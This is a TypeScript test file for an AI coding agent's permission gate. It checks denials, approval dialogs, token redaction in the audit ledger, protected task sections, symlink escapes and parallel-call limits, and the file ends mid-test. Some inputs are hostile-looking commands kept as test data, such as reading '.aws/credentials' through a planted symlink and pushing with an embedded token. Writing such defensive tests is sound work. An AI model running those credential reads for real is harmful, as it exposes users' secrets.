import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  CONFIRM_TIMEOUT_MS,
  enforce,
  InFlightCalls,
  MachinePostChecks,
  toToolAction,
  type EnforceDeps,
  type GateUi,
} from "../../../../src/adapters/pi/extension/enforce.ts";
import { canonicalDir } from "../../../../src/adapters/pi/extension/facts.ts";
import { Reconciler } from "../../../../src/adapters/pi/extension/reconcile.ts";
import { RunEvent } from "../../../../src/core/ledger/events.ts";
import type { GateContext } from "../../../../src/core/policy/gate.ts";
import type { RouteState } from "../../../../src/core/route/types.ts";
import { renderMachine } from "../../../../src/core/task/machine.ts";
import { makeTmp } from "../../../helpers/tmp.ts";

const cleanups: Array<() => Promise<void>> = [];
afterEach(async () => {
  vi.useRealTimers();
  for (const c of cleanups.splice(0)) await c();
});

const RUN_ID = "20261103T100000Z-1";
const TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
const FIELDS = { phase: "build", base: "abc123", checkpoint: "def456", worktree: "/w/t1", run: "r-1" };
const TASK_DOC = `# Task t1\n\n${renderMachine(FIELDS)}\n\n## Notes\n\nfree text here\n`;

interface FakeLedger {
  events: RunEvent[];
  append(e: RunEvent): void;
}
function fakeLedger(): FakeLedger {
  const events: RunEvent[] = [];
  // Validates like RunLedger but does not redact, so the test sees what enforce itself wrote.
  return { events, append: (e) => void events.push(RunEvent.parse(e)) };
}

async function world() {
  const t = await makeTmp("enforce");
  cleanups.push(t.cleanup);
  const root = join(t.dir, "project");
  mkdirSync(root, { recursive: true });
  const real = canonicalDir(root);
  const ledgerDir = canonicalDir(join(t.dir, "factory home", "runs"));
  const piAgentDir = canonicalDir(join(t.dir, "pi agent"));
  const answer: RouteState = { route: "answer", writeRoots: [], needsReclassification: false };
  const feature: RouteState = {
    route: "feature",
    tier: "feature",
    taskId: "t1",
    reason: "test",
    worktree: real,
    writeRoots: [real],
    needsReclassification: false,
  };
  const context = (route: RouteState, over: Partial<GateContext> = {}): GateContext => ({
    route,
    mode: "unattended",
    autonomy: "medium",
    home: canonicalDir(homedir()),
    piAgentDir,
    projectRoot: real,
    tmpRoots: [],
    ledgerDir,
    projectCommands: [],
    taskFileExists: true,
    gitDirs: [],
    ...over,
  });
  const ledger = fakeLedger();
  const postChecks = new MachinePostChecks();
  const inFlight = new InFlightCalls();
  const factoryTools = new Set<string>();
  const deps = (route: RouteState, over: Partial<GateContext> = {}, ui?: GateUi): EnforceDeps => ({
    policyContext: () => context(route, over),
    ledger,
    runId: RUN_ID,
    home: homedir(),
    postChecks,
    inFlight,
    factoryTools,
    ...(ui ? { ui } : {}),
  });
  const taskFile = join(root, ".factory", "knowledge", "tasks", "t1.md");
  return { dir: t.dir, root, real, answer, feature, context, ledger, postChecks, inFlight, factoryTools, deps, taskFile };
}

const GIT_ENV = { ...process.env, GIT_CONFIG_GLOBAL: process.platform === "win32" ? "NUL" : "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
/** A committed repository with one tracked file `a.txt` ("a\n"). */
function gitInit(root: string): void {
  const git = (...args: string[]) =>
    execFileSync("git", ["-c", "init.defaultBranch=main", "-c", "user.name=Factory Test", "-c", "user.email=factory-test@example.invalid", ...args], { cwd: root, env: GIT_ENV, stdio: "ignore" });
  git("init", "-q");
  writeFileSync(join(root, "a.txt"), "a\n");
  git("add", "-A");
  git("commit", "-q", "-m", "init");
}

let seq = 0;
function call(toolName: string, input: Record<string, unknown>, extra: { toolCallId?: string; parentToolCallId?: string } = {}) {
  return { type: "tool_call" as const, toolName, toolCallId: extra.toolCallId ?? `call-${++seq}`, input, ...extra };
}

function gates(l: FakeLedger) {
  return l.events.filter((e): e is Extract<RunEvent, { type: "gate" }> => e.type === "gate");
}

function confirmer(answer: boolean | Promise<boolean>) {
  const calls: Array<{ title: string; message: string }> = [];
  const ui: GateUi = {
    confirm: (title, message) => {
      calls.push({ title, message });
      return Promise.resolve(answer);
    },
  };
  return { ui, calls };
}

describe("enforce (tool_call hook)", () => {
  it("deny returns the Pi block result with the reason and audits one gate event", async () => {
    const w = await world();
    const ev = call("write", { path: "x.txt", content: "x" });
    const r = await enforce(ev, { cwd: w.root }, w.deps(w.answer));
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("the answer route cannot write");
    expect(gates(w.ledger)).toHaveLength(1);
    expect(gates(w.ledger)[0]).toMatchObject({ tool: "write", toolCallId: ev.toolCallId, decision: "deny", runId: RUN_ID });
  });

  it("ask + confirm true allows the call and audits `allow (approved)`", async () => {
    const w = await world();
    const { ui, calls } = confirmer(true);
    const outside = join(w.dir, "outside.txt");
    const r = await enforce(call("write", { path: outside, content: "x" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    expect(r).toBeUndefined();
    expect(calls).toHaveLength(1);
    expect(calls[0]!.title).toBe("Factory gate: outside-root-write");
    expect(calls[0]!.message).toContain("write");
    expect(calls[0]!.message).toContain(outside);
    expect(calls[0]!.message).toContain("write outside the route's write roots");
    expect(gates(w.ledger)).toEqual([
      expect.objectContaining({ decision: "allow (approved)", hardGate: "outside-root-write", tool: "write" }),
    ]);
  });

  it("ask + confirm false blocks and audits `deny (rejected)`", async () => {
    const w = await world();
    const { ui } = confirmer(false);
    const r = await enforce(call("bash", { command: "git push origin main" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("rejected");
    expect(gates(w.ledger)).toEqual([expect.objectContaining({ decision: "deny (rejected)", hardGate: "remote-mutation", class: "remote-mutating" })]);
  });

  it("ask without a UI is denied with `requires human approval`", async () => {
    const w = await world();
    const r = await enforce(call("bash", { command: "git push origin main" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }));
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("requires human approval");
    const [g] = gates(w.ledger);
    expect(g).toMatchObject({ decision: "deny", hardGate: "remote-mutation" });
    expect(g!.reason).toContain("requires human approval");
  });

  it("a confirm dialog that fails or never answers denies (timeout)", async () => {
    const w = await world();
    const failing: GateUi = { confirm: () => Promise.reject(new Error("ui gone")) };
    const r1 = await enforce(call("bash", { command: "git push" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, failing));
    expect(r1?.block).toBe(true);

    vi.useFakeTimers();
    const silent: GateUi = { confirm: () => new Promise<boolean>(() => {}) };
    const pending = enforce(call("bash", { command: "git push" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, silent));
    await vi.advanceTimersByTimeAsync(CONFIRM_TIMEOUT_MS);
    const r2 = await pending;
    expect(r2?.block).toBe(true);
    expect(gates(w.ledger).map((g) => g.decision)).toEqual(["deny (rejected)", "deny (rejected)"]);
  });

  it("an edit touching the machine section is blocked and the file is left alone", async () => {
    const w = await world();
    mkdirSync(join(w.taskFile, ".."), { recursive: true });
    writeFileSync(w.taskFile, TASK_DOC);
    const r = await enforce(
      call("edit", { path: w.taskFile, edits: [{ oldText: "checkpoint: def456", newText: "checkpoint: 000000" }] }),
      { cwd: w.root },
      w.deps(w.feature),
    );
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("machine-owned section");
    expect(readFileSync(w.taskFile, "utf8")).toBe(TASK_DOC);
    expect(gates(w.ledger)).toEqual([expect.objectContaining({ tool: "edit", decision: "deny" })]);
  });

  it("a write that creates a machine block in a new task file is blocked", async () => {
    const w = await world();
    const r = await enforce(call("write", { path: w.taskFile, content: TASK_DOC }), { cwd: w.root }, w.deps(w.feature));
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("machine-owned section");
  });

  it("an allowed edit that still alters the block (fuzzy match) is repaired at tool_result and a note is appended", async () => {
    const w = await world();
    mkdirSync(join(w.taskFile, ".."), { recursive: true });
    writeFileSync(w.taskFile, TASK_DOC);
    const ev = call("edit", { path: w.taskFile, edits: [{ oldText: "free text here", newText: "edited text" }] });
    expect(await enforce(ev, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();

    // Simulate the tool: the legitimate change plus an unexpected change inside the machine block.
    writeFileSync(w.taskFile, TASK_DOC.replace("free text here", "edited text").replace("checkpoint: def456", "checkpoint: 999999"));
    const original = [{ type: "text" as const, text: "Successfully replaced 1 block(s)." }];
    const res = w.postChecks.afterToolResult({ toolCallId: ev.toolCallId, content: original, isError: false }, w.ledger, RUN_ID);

    expect(readFileSync(w.taskFile, "utf8")).toBe(TASK_DOC.replace("free text here", "edited text"));
    expect(res?.content).toHaveLength(2);
    expect(res?.content?.[0]).toEqual(original[0]);
    const note = res?.content?.[1];
    expect(note?.type === "text" ? note.text : "").toMatch(/machine-owned section .* restored/);
    expect(w.ledger.events.filter((e) => e.type === "error")).toEqual([expect.objectContaining({ where: "machine-section" })]);
    // The audit trail still has exactly one gate event for the call.
    expect(gates(w.ledger).filter((g) => g.toolCallId === ev.toolCallId)).toHaveLength(1);
  });

  it("an allowed edit that keeps the block intact leaves the tool result unchanged", async () => {
    const w = await world();
    mkdirSync(join(w.taskFile, ".."), { recursive: true });
    writeFileSync(w.taskFile, TASK_DOC);
    const ev = call("edit", { path: w.taskFile, edits: [{ oldText: "free text here", newText: "edited text" }] });
    expect(await enforce(ev, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    writeFileSync(w.taskFile, TASK_DOC.replace("free text here", "edited text"));
    expect(w.postChecks.afterToolResult({ toolCallId: ev.toolCallId, content: [], isError: false }, w.ledger, RUN_ID)).toBeUndefined();
    // A second result for the same id (or an unknown id) is ignored.
    expect(w.postChecks.afterToolResult({ toolCallId: ev.toolCallId, content: [], isError: false }, w.ledger, RUN_ID)).toBeUndefined();
  });

  it("a write that deletes the block through a fuzzy path restores the whole pre-call file", async () => {
    const w = await world();
    mkdirSync(join(w.taskFile, ".."), { recursive: true });
    writeFileSync(w.taskFile, TASK_DOC);
    const ev = call("write", { path: w.taskFile, content: TASK_DOC.replace("free text here", "rewritten") });
    expect(await enforce(ev, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    writeFileSync(w.taskFile, "# Task t1\n\nno block any more\n");
    const res = w.postChecks.afterToolResult({ toolCallId: ev.toolCallId, content: [], isError: false }, w.ledger, RUN_ID);
    expect(readFileSync(w.taskFile, "utf8")).toBe(TASK_DOC);
    expect(res?.content).toHaveLength(1);
  });

  it("every decision appends exactly one gate event with a redacted summary", async () => {
    const w = await world();
    writeFileSync(join(w.root, "a.txt"), "a");
    const calls = [
      call("read", { path: "a.txt" }),
      call("bash", { command: `echo ${TOKEN}` }),
      call("write", { path: "b.txt", content: TOKEN }),
      call("dangerous_tool", { secret: TOKEN }),
    ];
    for (const c of calls) await enforce(c, { cwd: w.root }, w.deps(w.answer));
    const g = gates(w.ledger);
    expect(g.map((x) => x.toolCallId)).toEqual(calls.map((c) => c.toolCallId));
    expect(g.map((x) => x.decision)).toEqual(["allow", "allow", "deny", "deny"]);
    expect(g[1]!.summary).toContain("echo ***");
    for (const x of g) {
      expect(JSON.stringify(x)).not.toContain(TOKEN);
      expect(x.summary).not.toBe("");
    }
    expect(g[2]!.summary).toContain("b.txt");
  });

  it("a nested call is gated the same way and the gate event carries parentToolCallId", async () => {
    const w = await world();
    const ev = call("write", { path: join(w.dir, "outside.txt"), content: "x" }, { toolCallId: "p1/1", parentToolCallId: "p1" });
    const r = await enforce(ev, { cwd: w.root }, w.deps(w.feature));
    expect(r?.block).toBe(true);
    expect(gates(w.ledger)[0]).toMatchObject({ toolCallId: "p1/1", parentToolCallId: "p1", decision: "deny" });
  });

  it("an exception while building the policy context denies with a gate event (fail closed)", async () => {
    const w = await world();
    const deps: EnforceDeps = {
      ...w.deps(w.answer),
      policyContext: () => {
        throw new Error("config exploded");
      },
    };
    const r = await enforce(call("read", { path: "a.txt" }), { cwd: w.root }, deps);
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("config exploded");
    expect(gates(w.ledger)).toEqual([expect.objectContaining({ decision: "deny" })]);
    expect(gates(w.ledger)[0]!.reason).toContain("policy error");
  });

  it("a failed audit write blocks even an allowed call", async () => {
    const w = await world();
    const deps: EnforceDeps = {
      ...w.deps(w.answer),
      ledger: {
        append: () => {
          throw new Error("ENOSPC");
        },
      },
    };
    const r = await enforce(call("read", { path: "a.txt" }), { cwd: w.root }, deps);
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("audit");
  });
});

describe("toToolAction", () => {
  const facts = (cwd: string, factoryTools: ReadonlySet<string> = new Set()) => ({ cwd, home: homedir(), projectCommands: [], factoryTools });

  it("bash: one fact per pathArg and per path-like or existing readArg, input equal to the argument", async () => {
    const w = await world();
    writeFileSync(join(w.root, "a.txt"), "a");
    const a = toToolAction(call("bash", { command: "cp a.txt ../out.txt && cat ./missing notes" }), facts(w.root));
    expect(a.kind).toBe("command");
    if (a.kind !== "command") return;
    const inputs = a.pathFacts.map((f) => f.input);
    expect(inputs).toContain("../out.txt");
    expect(inputs).toContain("a.txt");
    expect(inputs).toContain("./missing");
    // Not path-like and not on disk: a word, not a file (R25).
    expect(inputs).not.toContain("notes");
    const out = a.pathFacts.find((f) => f.input === "../out.txt");
    expect(out?.resolved).toBe(join(canonicalDir(w.dir), "out.txt"));
  });

  it("read tools: the path when given; grep/find/ls without a path default to the cwd", async () => {
    const w = await world();
    const r = toToolAction(call("read", { path: "a.txt" }), facts(w.root));
    expect(r).toMatchObject({ kind: "read", tool: "read", path: { input: "a.txt", resolved: join(w.real, "a.txt") } });
    const g = toToolAction(call("grep", { pattern: "x" }), facts(w.root));
    expect(g).toMatchObject({ kind: "read", tool: "grep", path: { input: ".", resolved: w.real } });
  });

  it("write/edit: path facts, targetExists and the machine pre-check", async () => {
    const w = await world();
    writeFileSync(join(w.root, "plain.md"), "plain");
    const plain = toToolAction(call("write", { path: "plain.md", content: renderMachine(FIELDS) }), facts(w.root));
    expect(plain).toMatchObject({ kind: "write", tool: "write", touchesMachineSection: false, targetExists: true });
    const fresh = toToolAction(call("write", { path: "new.md", content: "x" }), facts(w.root));
    expect(fresh).toMatchObject({ targetExists: false, touchesMachineSection: false });
    const task = toToolAction(call("write", { path: w.taskFile, content: TASK_DOC }), facts(w.root));
    expect(task).toMatchObject({ touchesMachineSection: true });
    // A non-task file that already holds a block is protected too.
    writeFileSync(join(w.root, "other.md"), TASK_DOC);
    const other = toToolAction(call("edit", { path: "other.md", edits: [{ oldText: "checkpoint: def456", newText: "x" }] }), facts(w.root));
    expect(other).toMatchObject({ kind: "write", tool: "edit", touchesMachineSection: true });
  });

  it("classifies factory tools, powershell and anything else", async () => {
    const w = await world();
    // M2: a factory tool name counts only when this extension registered it.
    expect(toToolAction(call("set_route", { route: "small" }), facts(w.root))).toEqual({ kind: "unknown", tool: "set_route" });
    expect(toToolAction(call("set_route", { route: "small" }), facts(w.root, new Set(["set_route"])))).toEqual({ kind: "factory", tool: "set_route" });
    expect(toToolAction(call("powershell", { command: "Get-ChildItem" }), facts(w.root))).toMatchObject({ kind: "command", tool: "powershell" });
    expect(toToolAction(call("mcp_tool", {}), facts(w.root))).toEqual({ kind: "unknown", tool: "mcp_tool" });
    // A malformed built-in call is not trusted.
    expect(toToolAction(call("write", { path: 3 }), facts(w.root))).toEqual({ kind: "unknown", tool: "write" });
  });
});

describe("enforce: fix round 1 (R28-R31, M2-M4)", () => {
  /** `evil/up -> ../..` committed in the project: a relative symlink, no user name needed (review C1). */
  async function symlinkWorld() {
    const w = await world();
    mkdirSync(join(w.root, "evil"));
    symlinkSync(join("..", ".."), join(w.root, "evil", "up"));
    // The parent of the project plays home, so `out/up/.aws/credentials` lands on a home secret.
    const over: Partial<GateContext> = { mode: "interactive", home: canonicalDir(w.dir) };
    return { ...w, over };
  }

  it("R28: copying a planted symlink and then using the copy is not allowed silently", async () => {
    const w = await symlinkWorld();
    const { ui, calls } = confirmer(false);
    for (const command of ["cp -r evil out && cat out/up/.aws/credentials", "cp -r evil out && echo x > out/up/outside/f"]) {
      const r = await enforce(call("bash", { command }), { cwd: w.root }, w.deps(w.feature, w.over, ui));
      expect(r?.block, command).toBe(true);
    }
    // Both layers catch it (the gate's R28 ask on the missing later target, the copy's R28 `unknown` class);
    // the hard-gate ask is reported first.
    expect(calls.map((c) => c.title)).toEqual(["Factory gate: secrets", "Factory gate: outside-root-write"]);
    expect(gates(w.ledger).map((g) => g.class)).toEqual(["unknown", "unknown"]);
  });

  it("R28: a dereferencing copy still asks for the later target that does not exist yet", async () => {
    const w = await symlinkWorld();
    const { ui, calls } = confirmer(false);
    const r1 = await enforce(call("bash", { command: "cp -rL evil out && cat out/up/.aws/credentials" }), { cwd: w.root }, w.deps(w.feature, w.over, ui));
    const r2 = await enforce(call("bash", { command: "mkdir out && echo x > out/up/outside/f" }), { cwd: w.root }, w.deps(w.feature, w.over, ui));
    expect(r1?.block).toBe(true);
    expect(r2?.block).toBe(true);
    expect(calls.map((c) => c.title)).toEqual(["Factory gate: secrets", "Factory gate: outside-root-write"]);
    // The direct read through the symlink was already caught by its facts.
    const r3 = await enforce(call("bash", { command: "cat evil/up/.aws/credentials" }), { cwd: w.root }, w.deps(w.feature, w.over, ui));
    expect(r3?.block).toBe(true);
    expect(calls[2]?.title).toBe("Factory gate: secrets");
  });

  it.skipIf(process.platform === "win32")("R57: .factory protection applies to the lexical path as well as the resolved destination", async () => {
    const w = await world();
    const attempt = (path: string) => enforce(call("write", { path, content: "{}" }), { cwd: w.root }, w.deps(w.feature));
    // .factory/config.json is a symlink to an ordinary project file.
    mkdirSync(join(w.real, ".factory"), { recursive: true });
    writeFileSync(join(w.real, "shared.json"), "{}");
    symlinkSync(join("..", "shared.json"), join(w.real, ".factory", "config.json"));
    const r1 = await attempt(".factory/config.json");
    expect(r1?.block).toBe(true);
    expect(r1?.reason).toContain(".factory/");
    // .factory itself is a symlink to a directory outside the project.
    const w2 = await world();
    const elsewhere = join(w2.dir, "elsewhere");
    mkdirSync(elsewhere, { recursive: true });
    symlinkSync(elsewhere, join(w2.real, ".factory"));
    const r2 = await enforce(call("write", { path: ".factory/config.json", content: "{}" }), { cwd: w2.root }, w2.deps(w2.feature));
    expect(r2?.block).toBe(true);
    // A project file that is a symlink INTO .factory/config.json (resolved-path behaviour, kept).
    const w3 = await world();
    mkdirSync(join(w3.real, ".factory"), { recursive: true });
    writeFileSync(join(w3.real, ".factory", "config.json"), "{}");
    symlinkSync(join(".factory", "config.json"), join(w3.real, "cfg.json"));
    const r3 = await enforce(call("write", { path: "cfg.json", content: "{}" }), { cwd: w3.root }, w3.deps(w3.feature));
    expect(r3?.block).toBe(true);
    // The same through a command write target.
    const r4 = await enforce(call("bash", { command: "echo x > .factory/config.json" }), { cwd: w.root }, w.deps(w.feature));
    expect(r4?.block).toBe(true);
  });

  it("R28: facts report whether each target exists", async () => {
    const w = await world();
    writeFileSync(join(w.root, "a.txt"), "a");
    const a = toToolAction(call("bash", { command: "cat a.txt ./missing" }), { cwd: w.root, home: homedir(), projectCommands: [] });
    if (a.kind !== "command") throw new Error("expected a command");
    expect(a.pathFacts.find((f) => f.input === "a.txt")?.exists).toBe(true);
    expect(a.pathFacts.find((f) => f.input === "./missing")?.exists).toBe(false);
  });

  it("Task 11: an answer-route runner is allowed after a snapshot and reconciled at its own tool_result (replaces the R29 deny)", async () => {
    const w = await world();
    gitInit(w.real);
    const reconciler = new Reconciler(join(w.dir, "run"));
    const ev = call("bash", { command: "npm test" });
    const r = await enforce(ev, { cwd: w.root }, { ...w.deps(w.answer), reconciler });
    expect(r).toBeUndefined();
    expect(gates(w.ledger)).toEqual([expect.objectContaining({ decision: "allow", reason: expect.stringContaining("reconciled afterwards") })]);
    expect(reconciler.size).toBe(1);
    // The runner rewrites a tracked file; the result of another call does not reconcile it.
    writeFileSync(join(w.real, "a.txt"), "changed by the runner\n");
    expect(reconciler.finish({ toolCallId: "other", content: [], isError: false }, w.ledger, RUN_ID)).toBeUndefined();
    const out = reconciler.finish({ toolCallId: ev.toolCallId, content: [{ type: "text", text: "ok" }], isError: true }, w.ledger, RUN_ID);
    expect(readFileSync(join(w.real, "a.txt"), "utf8")).toBe("a\n");
    expect(JSON.stringify(out?.content)).toContain("Reverted on the answer route");
    expect(w.ledger.events.filter((e) => e.type === "reconciled")).toEqual([expect.objectContaining({ toolCallId: ev.toolCallId, reverted: ["a.txt"] })]);
  });

  it("R56: an approved (asked) answer-route runner is snapshotted before it runs and reconciled afterwards", async () => {
    const w = await world();
    gitInit(w.real);
    writeFileSync(join(w.real, ".env"), "TOKEN=x\n");
    const reconciler = new Reconciler(join(w.dir, "run"));
    const { ui, calls } = confirmer(true);
    const ev = call("bash", { command: "npm run test < .env" });
    const r = await enforce(ev, { cwd: w.root }, { ...w.deps(w.answer), reconciler, ui });
    expect(r).toBeUndefined();
    expect(calls).toHaveLength(1);
    expect(reconciler.size).toBe(1);
    writeFileSync(join(w.real, "a.txt"), "changed by the runner\n");
    reconciler.finish({ toolCallId: ev.toolCallId, content: [{ type: "text", text: "ok" }], isError: false }, w.ledger, RUN_ID);
    expect(readFileSync(join(w.real, "a.txt"), "utf8")).toBe("a\n");
  });

  it("R56: an approved answer-route runner whose snapshot fails is denied (fail closed)", async () => {
    const w = await world();
    const { ui } = confirmer(true);
    const reconciler = new Reconciler(join(w.dir, "run"));
    const r = await enforce(call("bash", { command: "npm run test < .env" }), { cwd: w.root }, { ...w.deps(w.answer), reconciler, ui });
    expect(r?.block).toBe(true);
    expect(reconciler.size).toBe(0);
  });

  it("Task 11: without a valid snapshot the runner is denied (fail closed): not a git work tree, or no reconciler in the session", async () => {
    const w = await world();
    const reconciler = new Reconciler(join(w.dir, "run"));
    const r1 = await enforce(call("bash", { command: "npm test" }), { cwd: w.root }, { ...w.deps(w.answer), reconciler });
    expect(r1?.block).toBe(true);
    expect(r1?.reason).toContain("not a git work tree");
    expect(r1?.reason).toContain("fail closed");
    expect(reconciler.size).toBe(0);
    gitInit(w.real);
    const r2 = await enforce(call("bash", { command: "npm test" }), { cwd: w.root }, w.deps(w.answer));
    expect(r2?.block).toBe(true);
    expect(r2?.reason).toContain("reconciliation is not available in this session");
    expect(gates(w.ledger).map((g) => g.decision)).toEqual(["deny", "deny"]);
    expect(w.inFlight.size).toBe(0);
  });

  it("Task 11: R38 over the untracked cap the runner is denied with the reason", async () => {
    const w = await world();
    gitInit(w.real);
    writeFileSync(join(w.real, "big.bin"), Buffer.alloc(51 * 1024 * 1024));
    const reconciler = new Reconciler(join(w.dir, "run"));
    const r = await enforce(call("bash", { command: "npm test" }), { cwd: w.root }, { ...w.deps(w.answer), reconciler });
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("too many untracked files to reconcile safely");
    expect(reconciler.size).toBe(0);
  });

  it("Task 11: a snapshot whose gate event cannot be written is discarded with the call", async () => {
    const w = await world();
    gitInit(w.real);
    const reconciler = new Reconciler(join(w.dir, "run"));
    const deps = { ...w.deps(w.answer), reconciler, ledger: { append: () => { throw new Error("disk full"); } } };
    const r = await enforce(call("bash", { command: "npm test" }), { cwd: w.root }, deps);
    expect(r?.block).toBe(true);
    expect(reconciler.size).toBe(0);
    expect(existsSync(join(w.dir, "run", "reconcile"))).toBe(true);
    expect(readdirSync(join(w.dir, "run", "reconcile"))).toEqual([]);
  });

  it("R30: the dialog shows the full command unredacted with its newlines; the ledger keeps the redacted summary", async () => {
    const w = await world();
    const { ui, calls } = confirmer(false);
    const command = `ls ${"README.md ".repeat(80)}\ngit push https://user:${TOKEN}@example.com/x.git`;
    await enforce(call("bash", { command }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    expect(calls).toHaveLength(1);
    expect(calls[0]!.message).toContain(command);
    const [g] = gates(w.ledger);
    expect(JSON.stringify(g)).not.toContain(TOKEN);
  });

  it("R30: a command too long to approve safely is denied without a dialog", async () => {
    const w = await world();
    const { ui, calls } = confirmer(true);
    const command = `ls ${"README.md ".repeat(450)}&& git push`;
    expect(command.length).toBeGreaterThan(4000);
    const r = await enforce(call("bash", { command }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("too long to approve safely");
    expect(calls).toHaveLength(0);
    expect(gates(w.ledger)).toEqual([expect.objectContaining({ decision: "deny" })]);
  });

  it("R31: while an allowed mutating call is in flight, further top-level calls are blocked (parallel batch)", async () => {
    const w = await world();
    writeFileSync(join(w.root, "a.txt"), "a");
    const cp = call("bash", { command: "cp a.txt out.txt" });
    expect(await enforce(cp, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    const second = await enforce(call("read", { path: "out.txt" }), { cwd: w.root }, w.deps(w.feature));
    expect(second?.block).toBe(true);
    expect(second?.reason).toContain("re-issue");
    // A nested call of the in-flight parent is gated normally, not blocked.
    const nested = call("write", { path: "nested.txt", content: "x" }, { toolCallId: `${cp.toolCallId}/1`, parentToolCallId: cp.toolCallId });
    expect(await enforce(nested, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    w.inFlight.done(nested.toolCallId);
    w.inFlight.done(cp.toolCallId);
    expect(await enforce(call("read", { path: "out.txt" }), { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect(gates(w.ledger).map((g) => g.decision)).toEqual(["allow", "deny", "allow", "allow"]);
  });

  it("R31 (Task 9): task_progress changes files and git state, so it is a mutating factory call; set_route is not", async () => {
    const w = await world();
    w.factoryTools.add("task_progress");
    w.factoryTools.add("set_route");
    const read = call("read", { path: "a.txt" });
    expect(await enforce(read, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect(await enforce(call("set_route", { route: "small" }), { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    const busy = await enforce(call("task_progress", { checkpoint: true }), { cwd: w.root }, w.deps(w.feature));
    expect(busy?.block).toBe(true);
    expect(busy?.reason).toContain("re-issue");
    w.inFlight.clear();
    const progress = call("task_progress", { checkpoint: true });
    expect(await enforce(progress, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect((await enforce(call("read", { path: "a.txt" }), { cwd: w.root }, w.deps(w.feature)))?.block).toBe(true);
  });

  it("R31: non-mutating calls run together; denied calls are not tracked", async () => {
    const w = await world();
    expect(await enforce(call("bash", { command: "ls" }), { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect(await enforce(call("read", { path: "a.txt" }), { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect((await enforce(call("write", { path: "x.txt", content: "x" }), { cwd: w.root }, w.deps(w.answer)))?.block).toBe(true);
    expect(await enforce(call("grep", { pattern: "x" }), { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect(w.inFlight.size).toBe(3);
    w.inFlight.clear();
    expect(w.inFlight.size).toBe(0);
  });

  it("R31 (N1): a mutating call is denied while an earlier read-only call of the batch is still in flight", async () => {
    const w = await symlinkWorld();
    const unattended = { ...w.over, mode: "unattended" as const };
    const first = call("bash", { command: "sleep 1 && cat out/up/.aws/credentials" });
    expect(await enforce(first, { cwd: w.root }, w.deps(w.feature, unattended))).toBeUndefined();
    // Fix round 4: an allowlisted mutating command (a recursive copy of a directory is unknown under R43).
    const second = await enforce(call("bash", { command: "mkdir out" }), { cwd: w.root }, w.deps(w.feature, unattended));
    expect(second?.block).toBe(true);
    expect(second?.reason).toContain("re-issue");
    w.inFlight.done(first.toolCallId);
    // Sequential execution: once the first call has finished, the write is decided on its own merits.
    expect(await enforce(call("bash", { command: "mkdir out" }), { cwd: w.root }, w.deps(w.feature, unattended))).toBeUndefined();
  });

  it("R31 (N1): nested calls of a running parent follow the same rule among themselves", async () => {
    const w = await world();
    const { ui } = confirmer(true);
    const parent = call("codemode", { code: "..." });
    expect(await enforce(parent, { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui))).toBeUndefined();
    const nested = (n: number, toolName: string, input: Record<string, unknown>) =>
      call(toolName, input, { toolCallId: `${parent.toolCallId}/${n}`, parentToolCallId: parent.toolCallId });
    const w1 = nested(1, "write", { path: "n1.txt", content: "x" });
    expect(await enforce(w1, { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    expect((await enforce(nested(2, "write", { path: "n2.txt", content: "x" }), { cwd: w.root }, w.deps(w.feature)))?.block).toBe(true);
    expect((await enforce(nested(3, "read", { path: "n1.txt" }), { cwd: w.root }, w.deps(w.feature)))?.block).toBe(true);
    w.inFlight.done(w1.toolCallId);
    expect(await enforce(nested(4, "read", { path: "n1.txt" }), { cwd: w.root }, w.deps(w.feature))).toBeUndefined();
    // A top-level call is still blocked while the mutating parent runs; the parent's end drops its nested calls.
    expect((await enforce(call("read", { path: "n1.txt" }), { cwd: w.root }, w.deps(w.feature)))?.block).toBe(true);
    w.inFlight.done(parent.toolCallId);
    expect(w.inFlight.size).toBe(0);
  });

  it("R31 (R2-1): a call is reserved while its approval dialog is open; a sibling arriving meanwhile is denied", async () => {
    const w = await world();
    let release: (ok: boolean) => void = () => {};
    const answers: Array<boolean | Promise<boolean>> = [true, new Promise<boolean>((res) => (release = res))];
    const ui: GateUi = { confirm: () => Promise.resolve(answers.shift() ?? false) };
    const d = () => w.deps(w.feature, { mode: "interactive" }, ui);
    const parent = call("codemode", { code: "..." });
    expect(await enforce(parent, { cwd: w.root }, d())).toBeUndefined();
    const nested = (n: number, command: string) =>
      call("bash", { command }, { toolCallId: `${parent.toolCallId}/${n}`, parentToolCallId: parent.toolCallId });

    const a = nested(1, "git push");
    const pendingA = enforce(a, { cwd: w.root }, d());
    await new Promise((res) => setImmediate(res));
    // A's dialog is open: the sibling must not slip past the conflict check.
    const b = await enforce(nested(2, "ls"), { cwd: w.root }, d());
